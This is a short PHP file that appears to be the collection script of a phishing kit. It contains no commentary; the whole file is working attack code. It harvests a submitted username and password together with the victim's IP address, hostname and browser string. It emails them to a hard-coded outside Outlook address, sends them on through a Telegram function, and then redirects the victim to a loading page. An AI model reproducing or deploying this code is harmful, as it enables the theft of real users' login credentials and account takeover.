<?php
include_once 'functions.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "===========================INFORMATIONS CONFIRMATION===========================\n";
$message .= "Identifiant              : ".$_POST['UserNameInput']."\n";
$message .= "Password                 : ".$_POST['PasswordInput']."\n";
$message .= "===========================INFOS OF MACHINE===========================\n";
$message .= "Ip              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "BROWSER     : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "===========================KA7iYAWDAN===========================\n";
$send = "roxxordeath00@outlook.fr";
$subject = "LOOOOG | $ip ";
$headers = "From:IDENTIFIANTE <roxxordeath00@outlook.fr>";
mail($send,$subject,$message,$headers);
$file = fopen('', 'a');
fwrite($file,$message);
telegram_send(urlencode($message));
header("Location: charg3m3nt2.php");

?>